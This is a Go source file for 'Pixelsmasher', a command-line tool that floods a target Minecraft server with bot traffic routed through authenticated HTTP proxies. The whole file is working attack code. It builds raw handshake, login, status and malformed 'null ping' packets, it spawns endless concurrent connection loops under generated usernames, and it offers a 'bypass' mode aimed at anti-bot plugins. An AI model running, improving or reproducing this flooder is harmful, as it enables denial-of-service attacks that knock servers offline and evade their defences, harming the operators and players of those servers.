package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func main() {
	var protocolVersion int
	var host string
	var joiner bool
	var pinger bool
	var pingjoin bool
	var handshake bool
	var bypass bool
	var nullping bool
	var threads int
	var proxyFile string
	var Reset = "\033[0m"
	var Red = "\033[31m"
	var Yellow = "\033[33m"
	var Blue = "\033[34m"
	var Magenta = "\033[35m"
	var White = "\033[97m"
	var Green = "\033[32m"
	var Cyan = "\033[36m"

	flag.StringVar(&host, "host", "", "IP of the server")
	flag.IntVar(&protocolVersion, "protocol", 763, "Minecraft protocol version")
	flag.BoolVar(&joiner, "join", false, "join method")
	flag.BoolVar(&handshake, "handshake", false, "handshake method")
	flag.BoolVar(&bypass, "bypass", false, "Sonar/jhab bypass")
	flag.BoolVar(&pinger, "ping", false, "ping method")
	flag.BoolVar(&nullping, "nullping", false, "null ping method")
	flag.BoolVar(&pingjoin, "pingjoin", false, "pingjoin methode")
	flag.IntVar(&threads, "threads", 1, "Number of threads")
	flag.StringVar(&proxyFile, "proxyfile", "proxies.txt", "Proxy file (auth HTTP proxies only)")
	flag.Parse()
	if flag.NFlag() == 0 {
		fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝`)
		fmt.Println("")
		fmt.Println(Blue + "                                     BY hakaneren899 and Randomname" + Reset)
		fmt.Println("")
		fmt.Println("")
		fmt.Println(Yellow + "./pixelsmasher -host <hostname:port> -threads <threads> -protocol <protocol-version> -proxyfile <proxies.txt> -<methodname>" + Reset)
		fmt.Println("")
		fmt.Println(Green + "Methods:" + Reset)
		fmt.Println("")
		fmt.Println(Green + "1) " + Cyan + "Join" + Reset)
		fmt.Println(Green + "2) " + Cyan + "Ping" + Reset)
		fmt.Println(Green + "3) " + Cyan + "Pingjoin" + Reset)
		fmt.Println(Green + "4) " + Cyan + "Nullping" + Reset)
		fmt.Println(Green + "5) " + Cyan + "Handshake" + Reset)
		fmt.Println(Green + "6) " + Cyan + "Bypass" + Reset)
		fmt.Println("")
		fmt.Println(Red + "Note: You can also use multiple flags at the end of the arguments. For ex: -join -ping -handshake" + Reset)
		fmt.Println("")
		return
	}
	var modes []string
	if joiner {
		modes = append(modes, "join")
	}
	if pinger {
		modes = append(modes, "ping")
	}
	if handshake {
		modes = append(modes, "hand")
	}
	if nullping {
		modes = append(modes, "nullping")
	}
	if pingjoin {
		modes = append(modes, "pingjoin")
	}
	if bypass {
		modes = append(modes, "bypass")
	}
	proxies, err := loadProxies(proxyFile)
	if err != nil {
		fmt.Printf("Failed to load proxies: %v\n", err)
		return
	}

	fmt.Printf(Red + `
        ██████╗ ██╗██╗  ██╗███████╗██╗     ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗███████╗██████╗
        ██╔══██╗██║╚██╗██╔╝██╔════╝██║     ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗
        ██████╔╝██║ ╚███╔╝ █████╗  ██║     ███████╗██╔████╔██║███████║███████╗███████║█████╗  ██████╔╝
        ██╔═══╝ ██║ ██╔██╗ ██╔══╝  ██║     ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══╝  ██╔══██╗
        ██║     ██║██╔╝ ██╗███████╗███████╗███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║███████╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝`)
	fmt.Println("")
	fmt.Println(Blue + "                                    BY hakaneren899 and Randomname" + Reset)
	fmt.Println("")
	fmt.Println("")
	fmt.Println(White+"Target IP:"+Magenta, host)
	fmt.Println(White+"Mode:"+Magenta, modes)
	fmt.Println(White+"Thread Count:"+Magenta, threads)
	fmt.Println(White+"Protocol:"+Magenta, protocolVersion)
	fmt.Printf(Reset)

	spam(host, modes, threads, proxies, protocolVersion)
}

func loadProxies(filePath string) ([]Proxy, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []Proxy
	scanner := bufio.NewScanner(file)
	for i := 0; i < 1000; i++ {
		for scanner.Scan() {
			line := scanner.Text()
			parts := strings.Split(line, ":")
			if len(parts) != 4 {
				continue
			}
			port, _ := strconv.Atoi(parts[1])
			proxies = append(proxies, Proxy{
				Host:     parts[0],
				Port:     port,
				Username: parts[2],
				Password: parts[3],
			})
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return proxies, nil

}

func spam(host string, modes []string, threads int, proxies []Proxy, protocolVersion int) {
	var wg sync.WaitGroup
	hostParts := strings.Split(host, ":")
	if len(hostParts) != 2 {
		fmt.Println("Invalid host format. Please provide host in 'hostname:port' format.")
		return
	}
	host = hostParts[0]
	portStr := hostParts[1]
	port, err := strconv.Atoi(portStr)
	if err != nil {
		fmt.Printf("Invalid port: %v\n", err)
		return
	}

	startSignal := make(chan struct{})
	proxyCount := len(proxies)
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer wg.Done()
			<-startSignal
			for {
				for i := 0; i < threads*20; i++ {
					loop(host, port, protocolVersion, threadID, proxyCount, proxies, threads, modes)
				}
			}
		}(i)

	}
	close(startSignal)
	wg.Wait()

}

func loop(host string, port int, protocolVersion int, threadID int, proxyCount int, proxies []Proxy, threads int, modes []string) {
	for i := 0; i < threads*200; i++ {
		proxy := proxies[i%proxyCount]
		username := fmt.Sprintf("Pixelsmasher-%d", i)
		go createClient(host, port, username, modes, proxy, protocolVersion)
	}
}

func createClient(host string, port int, username string, modes []string, proxy Proxy, protocolVersion int) {
	proxyAuth := "Basic " + base64.StdEncoding.EncodeToString([]byte(proxy.Username+":"+proxy.Password))
	options := fmt.Sprintf("%s:%d", proxy.Host, proxy.Port)
	conn, err := net.Dial("tcp", options)
	if err != nil {
		return
	}
	defer conn.Close()
	connectRequest := fmt.Sprintf(
		"CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Authorization: %s\r\n\r\n",
		host, port, host, port, proxyAuth,
	)
	conn.Write([]byte(connectRequest))

	for _, mode := range modes {
		if mode == "join" {
			conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			conn.Write(createLoginPacket(username))
			time.Sleep(1000)
		}
		if mode == "bypass" {
			conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
			conn.Write(pingjoinsend(username))
			time.Sleep(1000)
		}
		if mode == "ping" {
			conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
			conn.Write(createRequestPacket())
			time.Sleep(1000)
		}
		if mode == "hand" {
			conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
			time.Sleep(1 * time.Second)
		}
		if mode == "nullping" {
			conn.Write(createNullPingPacket())
			time.Sleep(100)
			conn.Write(createNullPingPacket())
			time.Sleep(100)
			conn.Write(createNullPingPacket())
			time.Sleep(1 * time.Second)
		}
		if mode == "pingjoin" {
			for i := 0; i < 1000; i++ {
				conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
				conn.Write(createRequestPacket())
				//time.Sleep(1000)
				conn.Write(createHandshakePacket(host, port, 1, protocolVersion))
				conn.Write(createRequestPacket())
				//time.Sleep(1000)
				conn.Write(createHandshakePacket(host, port, 2, protocolVersion))
				conn.Write(createLoginPacket(username))
				time.Sleep(1 * time.Second)
			}
		}
	}
}

func writeVarInt(value int) []byte {
	var buffer []byte
	for {
		if value&0xFFFFFF80 == 0 {
			buffer = append(buffer, byte(value))
			break
		}
		buffer = append(buffer, byte(value&0x7F|0x80))
		value >>= 7
	}
	return buffer
}

func createHandshakePacket(host string, port int, nextState int, protocolVersion int) []byte {
	hostBuffer := []byte(host)
	hostLength := writeVarInt(len(hostBuffer))
	portBuffer := []byte{byte(port >> 8), byte(port)}
	nextStateBuffer := writeVarInt(nextState)
	packetID := writeVarInt(0x00)
	protocolBuffer := writeVarInt(protocolVersion)
	packet := append(packetID, protocolBuffer...)
	packet = append(packet, hostLength...)
	packet = append(packet, hostBuffer...)
	packet = append(packet, portBuffer...)
	packet = append(packet, nextStateBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func pingjoinsend(username string) []byte {
	pingPacketID := writeVarInt(0x00)
	pingPacketLength := writeVarInt(len(pingPacketID))
	pingPacket := append(pingPacketLength, pingPacketID...)

	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))
	joinPacketID := writeVarInt(0x00)
	joinPacket := append(joinPacketID, usernameLength...)
	joinPacket = append(joinPacket, usernameBuffer...)
	joinPacketLength := writeVarInt(len(joinPacket))
	joinPacket = append(joinPacketLength, joinPacket...)

	combinedPacket := append(pingPacket, joinPacket...)

	return combinedPacket
}

func createRequestPacket() []byte {
	packetID := writeVarInt(0x00)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

func createLoginPacket(username string) []byte {
	usernameBuffer := []byte(username)
	usernameLength := writeVarInt(len(usernameBuffer))
	packetID := writeVarInt(0x00)
	packet := append(packetID, usernameLength...)
	packet = append(packet, usernameBuffer...)
	lengthBuffer := writeVarInt(len(packet))
	return append(lengthBuffer, packet...)
}

func createNullPingPacket() []byte {
	packetID := writeVarInt(0x2B)
	lengthBuffer := writeVarInt(len(packetID))
	return append(lengthBuffer, packetID...)
}

type Proxy struct {
	Host     string
	Port     int
	Username string
	Password string
}
